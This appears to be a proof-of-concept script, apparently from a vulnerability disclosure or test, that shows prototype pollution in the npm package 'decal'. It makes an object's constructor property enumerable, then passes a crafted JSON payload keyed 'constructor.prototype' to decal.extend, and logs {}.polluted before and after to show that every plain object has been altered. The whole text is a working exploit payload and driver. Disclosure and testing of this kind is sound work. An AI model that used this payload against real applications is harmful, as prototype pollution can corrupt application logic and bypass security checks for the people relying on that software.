var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
const decal = require('decal');
console.log({}.polluted);
const o = JSON.parse('{"constructor.prototype": {"polluted":"yes"}}');
decal.extend(obj, true, o);
console.log({}.polluted);